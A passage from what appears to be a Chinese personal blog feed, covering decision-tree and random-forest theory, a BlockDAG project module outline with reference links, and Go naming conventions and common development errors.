的条件熵和熵有相同的值；否则条件熵一定小于熵。<br>明确了这两个概念，理解信息增益就比较方便了。现在我们有一份数据集 D（例如贷款信息登记表）和特征 A（例如年龄），则<strong>A 的信息增益就是 D 本身的熵与特征 A 给定条件下 D 的条件熵之差</strong>，即：<br><img src="https://image.hackerjerry.top/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97-3.svg#height=26&id=EE8pQ&originHeight=26&originWidth=248&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=248"><br>数据集 D 的熵是一个常量。信息增益越大，表示条件熵 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618020812738-fffb9065-834c-444d-9a51-8881c89e799f.svg#height=26&id=tYvso&originHeight=26&originWidth=74&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=74"> 越小，A 消除 D 的不确定性的功劳越大。<br>所以要<strong>优先选择信息增益大的特征，它们具有更强的分类能力。</strong>由此生成决策树，称为<strong>ID3 算法</strong>。</p><h2 id="信息增益率"><a href="#信息增益率" class="headerlink" title="信息增益率"></a><strong>信息增益率</strong></h2><p>当某个特征具有多种候选值时，信息增益容易偏大，造成误差。引入信息增益率可以校正这一问题。<br>信息增益率 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618020812748-d95f3fa5-1a2f-4372-ad0b-78d11ef80423.svg#height=18&id=QMRXL&originHeight=18&originWidth=23&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=23"> 为信息增益与数据集 D 的熵之比：<br><img src="https://image.hackerjerry.top/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97-4.svg#height=59&id=lstWO&originHeight=59&originWidth=186&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=186"><br>同样，我们<strong>优先选择信息增益率最大的特征，</strong>由此生成决策树，称为<strong>C4.5 算法。</strong><br><strong>​</strong></p><h2 id="基尼不纯度（Gini-Impurity）"><a href="#基尼不纯度（Gini-Impurity）" class="headerlink" title="基尼不纯度（Gini Impurity）"></a><strong>基尼不纯度（Gini Impurity）</strong></h2><p>节点的基尼不纯度是指，根据节点中样本的分布对样本分类时，从节点中随机选择的样本被分错的概率。<br>如，在根节点中，根据节点中的样本标签有 44.4％的可能性错误地对某个随机选择的数据点进行分类。可以      使用以下等式得出这个值：</p><p><img src="https://image.hackerjerry.top/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97-5.png#height=56&id=dVbT7&originHeight=242&originWidth=757&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=176"><br>节点 n 的基尼不纯度是<strong>1 减去每个类（二元分类任务中是 2）的样本比例的平方和</strong>。</p><p>例如根节点的基尼不纯度：<br><img src="https://image.hackerjerry.top/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97-6.png#height=73&id=NEETK&originHeight=73&originWidth=1080&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=1080"></p><p>在每个节点，决策树要在所有特征中搜索用于拆分的值，从而可以<strong>最大限度地减少基尼不纯度</strong>。（拆分节点的另一个<strong>替代方法</strong>是使用<strong>信息增益</strong>）。<br>然后，它以贪婪递归的过程重复这种拆分，直到达到最大深度，或者每个节点仅包含同类的样本。<br>树每层的加权总基尼不纯度（每个节点的基尼不纯度按照该节点中来自父节点的点的比例进行加权）一定是减少的。在树的第二层，总加权基尼不纯度值为 0.333：<br><img src="https://image.hackerjerry.top/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97-7.png#height=58&id=idTVC&margin=%5Bobject%20Object%5D&name=image.png&originHeight=77&originWidth=845&originalType=binary%E2%88%B6=1&size=17368&status=done&style=none&width=641" alt="image.png"><br>最终，最后一层的加权总基尼不纯度变为 0，也意味着每个节点都是完全纯粹的，从节点中随机选择的点不会被错误分类。虽然这一切看起来挺好的，但这意味着模型可能过拟合，因为所有节点都是仅仅使用训练数据构建的。</p><h2 id="决策树剪枝"><a href="#决策树剪枝" class="headerlink" title="决策树剪枝"></a>决策树剪枝</h2><p>决策树生成算法递归产生一棵决策树，直到结束划分。什么时候结束呢？</p><ul><li>样本属于同一种类型</li><li>没有特征可以分割</li></ul><p>这样得到的决策树往往对训练数据分类非常精准，但是对于未知数据表现比较差。<br>原因在于基于训练集构造的决策树过于复杂，<strong>产生过拟合</strong>。所以需要对决策树简化，砍掉多余的分支，提高泛化能力。<br>决策树剪枝一般有两种方法：</p><ul><li><strong>预剪枝</strong>：在树的生成过程中剪枝。<strong>基于贪心策略，可能造成局部最优</strong></li><li><strong>后剪枝</strong>：等树全部生成后剪枝。<strong>运算量较大，但是比较精准</strong></li></ul><p>决策树剪枝往往通过<strong>极小化决策树整体的损失函数实现</strong>。</p><p><img src="https://image.hackerjerry.top/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97-8.png#height=281&id=iUL7X&margin=%5Bobject%20Object%5D&name=image.png&originHeight=561&originWidth=731&originalType=binary%E2%88%B6=1&size=122786&status=done&style=none&width=365.5" alt="image.png"><br>假设树 T 有|T|个叶子节点，某一个叶子节点 t 上有 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618021002264-6488bff2-9519-4ecc-bbdd-6f2f86c34189.svg#height=23&id=p7K03&originHeight=23&originWidth=24&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=24"> 个样本，其中 k 类的样本有 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618021002341-9e586245-0eb4-43f1-ab4b-e9d2f1514bd9.svg#height=23&id=Jvs0Y&originHeight=23&originWidth=32&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=32"> 个，<img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618021002330-b42005d2-d60f-4e39-927c-852a31a4810e.svg#height=26&id=W8yRc&originHeight=26&originWidth=56&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=56"> 为叶子节点 t 的熵， <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618021002461-670ab097-97d8-4674-b83a-a27eed267988.svg#height=21&id=Ihqmy&originHeight=21&originWidth=52&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=52"> 是参数，则决策树的<strong>损失函数</strong>定义为：<br><img src="https://image.hackerjerry.top/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97-9.svg#height=69&id=GEe9U&originHeight=69&originWidth=264&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=264"><br>其中熵为：<br><img src="https://image.hackerjerry.top/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97-10.svg#height=57&id=M7VkN&originHeight=57&originWidth=246&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=246"><br><strong>损失函数第一项为训练误差，第二项为模型复杂度，</strong>用参数 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618021002545-b6955ef3-85ad-4594-9a5e-f5a27be46475.svg#height=15&id=JPvdT&originHeight=15&originWidth=13&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=13"> 来衡量二者的比重。</p><h2 id="CART-算法"><a href="#CART-算法" class="headerlink" title="CART 算法"></a>CART 算法</h2><p>CART 表示分类回归决策树，同样由特征选择、树的生成及剪枝组成，可以处理分类和回归任务。<br>相比之下，<strong>ID3 和 C4.5 算法只能处理分类任务</strong>。<br>CART 假设决策树是二叉树，内部结点特征的取值为“是”和“否”，依次递归地二分每个特征。<br>CART 对<strong>回归树</strong>采用<strong>平方误差</strong>最小化准则<strong>，</strong>对<strong>分类树</strong>用<strong>基尼指数</strong>最小化准则。</p><h2 id="过拟合–为什么森林比一棵树更好"><a href="#过拟合–为什么森林比一棵树更好" class="headerlink" title="过拟合–为什么森林比一棵树更好"></a>过拟合–为什么森林比一棵树更好</h2><p><strong>因为这棵树是在训练数据上没有犯错，我们没有限制最大深度（树的层数），因此泛化能力差。</strong><br>过拟合发生在当我们有一个非常灵活的模型（模型具有高能力）时，其本质上是通过紧密拟合来记住训练数据。这样的问题是模型不仅学到了训练数据中的实际关系，还学习了存在的噪声。灵活的模型具有高方差<strong>（variance）</strong>，因为学到的参数（例如决策树的结构）将随着训练数据的不同而变化很大。</p><p>当我们<strong>不限制最大深度时决策树容易过拟合的原因</strong>是它<strong>具有无限的灵活性</strong>，这意味着它可以持续生长，直到它为每个单独的观察点都生成一个叶节点，<strong>达到完美地分类</strong>。<br>如果返回到之前决策树的图像并将最大深度限制为 2（仅进行一次拆分），则分类不再 100％正确。我们减少了决策树的方差，但代价是增加了偏差。<br><strong>限制树的深度</strong>可以<strong>减少方差（好）</strong>并且<strong>增加偏差（坏）</strong>，一种替代方案是，我们可以将许多决策树组合成一个称为随机森林的集成模型（ensemble model）。<br>​</p><h1 id="随机森林"><a href="#随机森林" class="headerlink" title="随机森林"></a>随机森林</h1><p>我们将使用<strong>CART 决策树</strong>作为<strong>弱学习器的 bagging 方法</strong>称为<strong>随机森林</strong>。<br>bagging 是一种在原始数据集上，通过<strong>有放回抽样</strong>分别选出 k 个新数据集，来训练分类器的集成算法。分类器之间没有依赖关系。<br><img src="https://image.hackerjerry.top/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97-11.png#height=162&id=iOtB0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=323&originWidth=799&originalType=binary%E2%88%B6=1&size=117004&status=done&style=none&width=399.5" alt="image.png"><br>随机森林是由许多决策树组成的模型。这个模型不是简单地平均所有树（我们可以称之为“森林”）的预测，而是使用了两个关键概念，名字中的随机二字也是由此而来：</p><ul><li>在构建树时对训练数据点进行随机抽样</li><li>分割节点时考虑特征的随机子集</li></ul><h2 id="随机抽样训练观测数据"><a href="#随机抽样训练观测数据" class="headerlink" title="随机抽样训练观测数据"></a><strong>随机抽样训练观测数据</strong></h2><p>在训练时，随机森林中的<strong>每棵树</strong>都会<strong>从数据点的随机样本中学习</strong>。<strong>样本被有放回的抽样</strong>，称为<strong>自助抽样法</strong>（<strong>bootstrapping</strong>），这意味着<strong>一些样本将在一棵树中被多次使用</strong>。背后的<strong>想法</strong>是<strong>在不同样本上训练每棵树，尽管每棵树相对于特定训练数据集可能具有高方差，但总体而言，整个森林将具有较低的方差，同时不以增加偏差为代价。</strong><br>在测试时，通过<strong>平均每个决策树的预测</strong>来进行预测。这种<strong>在不同的自助抽样数据子集上训练单个学习器，然后对预测进行平均的过程称为 bagging</strong>，是 bootstrap aggregating 的缩写。</p><h2 id="用于拆分节点的随机特征子集"><a href="#用于拆分节点的随机特征子集" class="headerlink" title="用于拆分节点的随机特征子集"></a><strong>用于拆分节点的随机特征子集</strong></h2><p>随机森林中的另一个主要概念是，<strong>只考虑所有特征的一个子集来拆分每个决策树中的每个节点</strong>。通常将<strong>其设置为 sqrt（n_features）</strong>以进行分类，这意味着<strong>如果有 16 个特征</strong>，则在<strong>每个树中的每个节点处</strong>，<strong>只考虑 4 个随机特征</strong>来拆分节点。（随机森林也可以在每个节点处考虑所有的特征，如回归中常见的那样。这些选项可以在 Scikit-Learn Random Forest 的实现中控制）。<br>如果你能理解一棵单独的决策树，bagging 的理念，以及随机的特征子集，那么你对随机森林的工作方式也就有了很好的理解：</p><blockquote><p>随机森林将成百上千棵决策树组合在一起，在略微不同的观察集上训练每个决策树，在每棵树中仅考虑有限数量的特征来拆分节点。<strong>随机森林的最终预测是通过平均每棵树的预测来得到的</strong>。</p></blockquote><p>想理解为什么随机森林优于单一的决策树，请想象以下场景：你要判断特斯拉的股票是否上涨，现在你身边有十几位对该公司都没有先验知识的分析师。每个分析师都有较低的偏见，因为他们没有任何假设，并且可以从新闻报道的数据集中学习。<br>这似乎是一个理想的情况，但问题是报道中除了真实的信号外也可能包含噪音。 因为分析师们完全根据数据做出预测，即他们具有很高的灵活性，也就意味着他们可能会被无关的信息所左右。分析师们可能会从同一数据集中得出不同的预测。此外，如果提供不同的报道训练集，每个分析师都有高方差，并得出截然不同的预测。<br>解决方案是不依赖于任何一个人，而是汇集每个分析师的投票。此外，与随机森林一样，允许每个分析师仅使用一部分报道，并希望通过采样来消除噪声信息的影响。在现实生活中，我们也依赖于多种信息来源（从不信任亚马逊的单独评论），因此，不仅决策树的思想很直观，而且将它们组合在一起成为随机森林的想法同样如此。</p><h2 id="算法特点"><a href="#算法特点" class="headerlink" title="算法特点"></a>算法特点</h2><p>由于随机性，<strong>随机森林对于降低模型方差效果显著</strong>。故随机森林一般不需要额外剪枝，就能取得较好的泛化性能。</p><p>相对而言，模型对于训练集的拟合程度就会差一些，相比于基于 boosting 的 GBDT 模型，偏差会大一些。</p><p>另外，<strong>随机森林中的树一般会比较深，以尽可能地降低偏差；而 GBDT 树的深度会比较浅，通过减少模型复杂度来降低方差</strong>。</p><p>最后，我们总结一下随机森林都有哪些优点：</p><ul><li>采用了集成算法，精度优于大多数单模型算法</li><li>在测试集上表现良好，两个随机性的引入降低了过拟合风险</li><li>树的组合可以让随机森林处理非线性数据</li><li>训练过程中能检测特征重要性，是常见的<strong>特征筛选</strong>方法</li><li>每棵树可以同时生成，并行效率高，训练速度快</li><li>可以自动处理缺省值</li></ul><h1 id="模型评价"><a href="#模型评价" class="headerlink" title="模型评价"></a>模型评价</h1><p>AUC(area under the curve)是 ROC 曲线下的面积。所以，在理解 AUC 之前，要先了解 ROC 是什么。而 ROC 的计算又需要借助混淆矩阵。</p><blockquote><p>AUC 是一个从 0（最差）到 1（最佳）的度量值，</p></blockquote><p>我们还可以绘制单个决策树（顶部）和随机森林（底部）的 ROC 曲线。<strong>靠近左上角的曲线代表着更好的模型：</strong><br><img src="https://image.hackerjerry.top/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97-12.png#height=271&id=ImDoE&margin=%5Bobject%20Object%5D&name=image.png&originHeight=542&originWidth=777&originalType=binary%E2%88%B6=1&size=81703&status=done&style=none&width=388.5" alt="image.png"></p><h1 id="问答"><a href="#问答" class="headerlink" title="问答"></a>问答</h1><h2 id="为什么要随机抽样训练集？"><a href="#为什么要随机抽样训练集？" class="headerlink" title="为什么要随机抽样训练集？"></a><strong>为什么要随机抽样训练集？</strong></h2><p>如果不进行随机抽样，每棵树的训练集都一样，那么最终训练出的树分类结果也是完全一样的，这样的话完全没有 bagging 的必要；</p><h2 id="为什么要有放回地抽样？"><a href="#为什么要有放回地抽样？" class="headerlink" title="为什么要有放回地抽样？"></a><strong>为什么要有放回地抽样？</strong></h2><p>如果不是有放回的抽样，那么每棵树的训练样本都是不同的，都是没有交集的，这样每棵树都是”有偏的”，都是绝对”片面的”（当然这样说可能不对），也就是说每棵树训练出来都是有很大的差异的；而随机森林最后分类取决于多棵树（弱分类器）的投票表决，这种表决应该是”求同”，因此使用完全不同的训练集来训练每棵树这样对最终分类结果是没有帮助的，这样无异于是”盲人摸象”。</p><h2 id="随机森林的随机体现在哪里？"><a href="#随机森林的随机体现在哪里？" class="headerlink" title="随机森林的随机体现在哪里？"></a><strong>随机森林的随机体现在哪里？</strong></h2><p>1）如果训练集大小为 N，对于每棵树而言，随机且有放回地从训练集中的抽取 N 个训练样本（这种采样方式称为 bootstrap sample 方法），作为该树的训练集；</p><blockquote><p>从这里我们可以知道：每棵树的训练集都是不同的，而且里面包含重复的训练样本</p></blockquote><p>2）如果每个样本的特征维度为 M，指定一个常数 m&lt;&lt;M，随机地从 M 个特征中选取 m 个特征子集，每次树进行分裂时，从这 m 个特征中选择最优的；<br>​</p><h2 id="这两种随机有什么好处？"><a href="#这两种随机有什么好处？" class="headerlink" title="这两种随机有什么好处？"></a><strong>这两种随机有什么好处？</strong></h2><p>两个随机性的引入对随机森林的分类性能至关重要。由于它们的引入，使得随机森林不容易陷入过拟合，并且具有很好得抗噪能力（比如：对缺省值不敏感）。</p><h2 id="随机森林分类的错误率和什么有关？"><a href="#随机森林分类的错误率和什么有关？" class="headerlink" title="随机森林分类的错误率和什么有关？"></a><strong>随机森林分类的错误率和什么有关？</strong></h2><ul><li>森林中任意两棵树的相关性：相关性越大，错误率越大；</li><li>森林中每棵树的分类能力：每棵树的分类能力越强，整个森林的错误率越低。</li></ul><p>​</p><p>减小特征选择个数 m，树的相关性和分类能力也会相应的降低；增大 m，两者也会随之增大。所以关键问题是如何选择最优的 m（或者是范围），这也是随机森林唯一的一个参数。<br>​</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BlockDAG从零到一</title>
    <link href="/2021/04/02/BlockDAG%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80_new/"/>
    <url>/2021/04/02/BlockDAG%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80_new/</url>
    
    <content type="html"><![CDATA[<p>加油！</p><a id="more"></a><h1 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h1><ul><li><p>DAG</p><ul><li>SPECTRE<ul><li>snapshot.go–生成快照</li><li>vote.go–投票</li><li>log.go–记录日志</li></ul></li><li>accepttxs.go–维持可信交易集</li><li>blockdag.go–主程序</li><li>difficulty.go–动态调整 pow 困难度</li><li>error.go–错误信息</li><li>log.go–日志信息</li><li>process.go–将区块加入链？或者称检查块的合法性</li></ul></li><li><p>minner</p><ul><li>pow.go–工作量证明</li><li>worker.go</li></ul></li><li><p>account</p><ul><li>user.go–用户相关，身份认定，发送交易</li></ul></li><li><p>bloom</p><ul><li>timebloom.go–时间布隆过滤器</li><li>rangebloom.go–范围布隆过滤器</li></ul></li><li><p>p2pnet</p><ul><li>libp2p–p2p 网络对等节点发现</li></ul></li><li><p>mempool–内存池</p></li><li><p>crypto–密码学模块</p><ul><li>pkcs12–引用 gmsm <a href="https://github.com/tjfoc/gmsm">https://github.com/tjfoc/gmsm</a> 好像性能有点问题？ 这里有另外一个<a href="https://github.com/rongzer/gm">https://github.com/rongzer/gm</a> 看情况吧</li><li>sm2<ul><li>p256.go</li><li>sm2.go</li><li>utils.go</li></ul></li><li>sm3<ul><li>sm3.go</li><li>ifile</li></ul></li><li>sm4<ul><li>sm4.go</li><li>sm4_gcm.go</li><li>utils.go</li></ul></li></ul></li><li><p>database-存储 <a href="https://github.com/vldmkr/merkle-patricia-trie">https://github.com/vldmkr/merkle-patricia-trie</a></p><ul><li><p>mpt</p><ul><li>node.go</li><li>tire.go</li><li>type.go</li></ul></li><li><p>storage</p><ul><li>adapter.go</li><li>leveldb.go</li><li>memory.go</li></ul></li><li><p>database.go–利用 leveldb 存储交易（MPT），在区块中只存储根节点 hsha。</p></li><li><p>merkletire.go–MPT 树存储</p></li><li><p>可以先尝试安装<a href="https://github.com/soteria-dag/soterd/tree/master/database">https://github.com/soteria-dag/soterd/tree/master/database</a>，看看能不能保存交易</p></li></ul></li></ul><h1 id="p2pnet"><a href="#p2pnet" class="headerlink" title="p2pnet"></a>p2pnet</h1><p><a href="https://segmentfault.com/a/1190000018590682">区块链中的 P2P</a><br><a href="https://www.shangmayuan.com/a/61258d114131449994f5278e.html">使用 Go 语言编写区块链 P2P 网络</a>–项目：<a href="https://github.com/nosequeldeebee/blockchain-tutorial/blob/master/p2p/main.go">https://github.com/nosequeldeebee/blockchain-tutorial/blob/master/p2p/main.go</a><br><a href="https://github.com/Blockchain-CN/blockchain">https://github.com/Blockchain-CN/blockchain</a> –实现了对等协议的<br><a href="https://bbbob.win/b6edc29f/">利用 go-libp2p 实现在区块链上的 p2p</a>–里面目录分的挺清楚的</p><h1 id="mempool"><a href="#mempool" class="headerlink" title="mempool"></a>mempool</h1><p><a href="https://learnblockchain.cn/books/geth/part2/txpool/txpool.html">以太坊交易池架构设计</a>–这一系列很全<br><a href="https://blog.csdn.net/loy_184548/article/details/86178255">【区块链】比特币学习 - 4 - 交易池</a><br><a href="https://segmentfault.com/a/1190000017333194">以太坊源码分析：交易缓冲池 txpool</a><br><a href="https://github.com/lianxiangcloud/linkchain/tree/release/v0.1.3/mempool">https://github.com/lianxiangcloud/linkchain/tree/release/v0.1.3/mempool</a><br><a href="https://www.jianshu.com/p/521a0926303a">btcd 源码分析系列：6 - mempool</a><br><a href="https://github.com/wupeaking/tendermint_code_analysis/blob/master/Mempool%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.md">Mempool 源码分析</a><br><a href="https://github.com/letsfire/factory">https://github.com/letsfire/factory</a> –单纯的内存池，而非交易池<br><img src="https://image.hackerjerry.top/BlockDAG%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-1.png#align=left&display=inline&height=299&margin=%5Bobject%20Object%5D&name=image.png&originHeight=598&originWidth=1303&size=258120&status=done&style=none&width=651.5" alt="image.png"><br>说实话，这个有点难，可能暂时不考虑实现了。</p><h1 id="account"><a href="#account" class="headerlink" title="account"></a>account</h1><p><img src="https://image.hackerjerry.top/BlockDAG%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-2.png#align=left&display=inline&height=288&margin=%5Bobject%20Object%5D&name=image.png&originHeight=576&originWidth=626&size=139030&status=done&style=none&width=313" alt="image.png"><br>来自白皮书：<a href="https://www.lianxiangcloud.com/static/download/%E4%BA%AB%E4%BA%91%E9%93%BE%E7%99%BD%E7%9A%AE%E4%B9%A61.0.pdf">享云链白皮书 1.0</a><br><a href="https://learnblockchain.cn/books/geth/part3/sign-and-valid.html">签名与校验</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GO开发指南</title>
    <link href="/2021/04/02/GO%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97_new/"/>
    <url>/2021/04/02/GO%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97_new/</url>
    
    <content type="html"><![CDATA[<p>记录在进行 go 语言开发遇到的各种问题。</p><a id="more"></a><h1 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h1><h3 id="文件命名"><a href="#文件命名" class="headerlink" title="文件命名"></a>文件命名</h3><p>文件命名一律采用小写，不用驼峰式，尽量见名思义，看见文件名就可以知道这个文件下的大概内容。<br>其中测试文件以<em>test.go 结尾，除测试文件外，命名不出现</em>。<br>例子：</p><blockquote><p>stringutil.go， stringutil_test.go</p></blockquote><h3 id="package"><a href="#package" class="headerlink" title="package"></a>package</h3><p>包名用小写,使用短命名,尽量和标准库不要冲突。<br>包名统一使用单数形式。</p><p>在 go 源文件的开头必须申明文件所属的 package，如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> name<br>......<br></code></pre></td></tr></table></figure><h2 id="命名规范-1"><a href="#命名规范-1" class="headerlink" title="命名规范"></a>命名规范</h2><ul><li>建议 package 命名用小写字母</li><li>建议 packag<strong>e 命名必和其路径的最后一段一致</strong>（main package 除外）。注意，这并不是 Golang 的强制要求，文件目录只是用于存放同一个 package 的所有源文件，Golang 对目录名并无要求。但<strong>一个目录下不允许有多个 package 的源文件</strong>。</li><li>main package 中的 main 方法是可执行文件的入口，main package 名一般和路径名不一致</li><li>不同路径下 package 命名可以重复，但其完整路径名必须唯一</li></ul><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>变量命名一般采用驼峰式，当遇到特有名词（缩写或简称，如 DNS）的时候，特有名词根据是否私有全部大写或小写。<br>例子：</p><blockquote><p>apiClient、URLString</p></blockquote><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>单个函数的接口名以 er 为后缀</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1.</span> <span class="hljs-keyword">type</span> Reader <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-number">2.</span>     Read(p []<span class="hljs-keyword">byte</span>) (n <span class="hljs-keyword">int</span>, err error)<br><span class="hljs-number">3.</span> &#125;<br></code></pre></td></tr></table></figure><p>两个函数的接口名综合两个函数名，如:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1.</span> <span class="hljs-keyword">type</span> WriteFlusher <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-number">2.</span> Write([]<span class="hljs-keyword">byte</span>) (<span class="hljs-keyword">int</span>, error)<br><span class="hljs-number">3.</span> Flush() error<br><span class="hljs-number">4.</span> &#125;<br></code></pre></td></tr></table></figure><p>三个以上函数的接口名类似于结构体名，如:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1.</span> <span class="hljs-keyword">type</span> Car <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-number">2.</span>     Start()<br><span class="hljs-number">3.</span>     Stop()<br><span class="hljs-number">4.</span>     Drive()<br><span class="hljs-number">5.</span> &#125;<br></code></pre></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>方法名应该是动词或动词短语，采用驼峰式。将功能及必要的参数体现在名字中， 不要嫌长， 如 updateById，getUserInfo.<br>如果是结构体方法，那么 Receiver 的名称应该缩写，一般使用一个或者两个字符作为 Receiver 的名称。如果 Receiver 是指针， 那么统一使用 p。 如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1.</span> <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(f foo)</span> <span class="hljs-title">method</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-number">2.</span>     ...<br><span class="hljs-number">3.</span> &#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1.</span> <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *foo)</span> <span class="hljs-title">method</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-number">2.</span>     ...<br><span class="hljs-number">3.</span> &#125;<br></code></pre></td></tr></table></figure><p>对于 Receiver 命名应该统一， 要么都使用值， 要么都用指针。<br>每个以大写字母开头（即可以导出）的方法应该有注释，且以该函数名开头。如：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> <span class="hljs-comment">// Get 会响应对应路由转发过来的 get 请求.</span><br><span class="hljs-number">2.</span> func (c *Controller) Get() &#123;<br><span class="hljs-number">3.</span>     ...<br><span class="hljs-number">4.</span> &#125;<br></code></pre></td></tr></table></figure><p>大写字母开头的方法以为着是可供调用的公共方法，如果你的方法想只在本包内掉用，请以小写字母开发。如:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-number">1.</span> <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Controller)</span> <span class="hljs-title">curl</span><span class="hljs-params">()</span> &#123;</span><br><span class="hljs-number">2.</span>     ...<br><span class="hljs-number">3.</span> &#125;<br></code></pre></td></tr></table></figure><p>注释应该用一个完整的句子，注释的第一个单词应该是要注释的指示符，以便在 godoc 中容易查找。<br>注释应该以一个句点 . 结束。</p><h1 id="各种报错"><a href="#各种报错" class="headerlink" title="各种报错"></a>各种报错</h1><p>【1】<strong>“与你运行的 Windows 版本不兼容“的解决方法</strong><br><a href="https://blog.csdn.net/willingtolove/article/details/107924423">https://blog.csdn.net/willingtolove/article/details/107924423</a><br>其实就是 package 名字错了，必须改成 main，不清楚为什么？<br>【2】每次创建新的项目都要<strong>重新设置一个 configuration 文件</strong>，后发现是我的问题，开发的时候，可以把所有的项目都在 goland 里打开，根目录就是$GOPATH,像这样：<br><img src="https://image.hackerjerry.top/GO%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97-1.png#align=left&display=inline&height=274&margin=%5Bobject%20Object%5D&name=image.png&originHeight=548&originWidth=431&size=24414&status=done&style=none&width=215.5" alt="image.png"><br>所有小项目都放在 src 里，是不是很棒？<br>但是！<strong>必须有 main 包</strong>，必须有 main 函数作为程序入口！<br>具体原理看：<br><a href="https://blog.csdn.net/zxy_666/article/details/80390843">https://blog.csdn.net/zxy_666/article/details/80390843</a><br><a href="https://zhuanlan.zhihu.com/p/69445822">如何写出优雅的 Golang 代码</a><br><a href="https://blog.csdn.net/CMbug/article/details/49339341">Golang import 包问题相关详解</a><br><a 